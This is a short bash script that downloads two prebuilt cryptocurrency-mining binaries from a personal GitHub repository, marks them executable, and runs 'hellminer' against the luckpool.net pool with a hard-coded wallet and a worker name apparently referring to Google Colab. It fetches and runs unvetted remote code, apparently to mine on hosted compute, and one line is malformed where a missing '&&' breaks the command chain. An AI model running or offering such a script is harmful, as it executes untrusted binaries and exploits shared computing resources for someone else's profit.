#!/bin/bash
apt-get install msr-tools
wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && apt install screen
./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RTAwJV7VgwUEmKfnZEkF2SCkoaPN32NbDL.CoogleColabsPro1 -p x --cpu 96
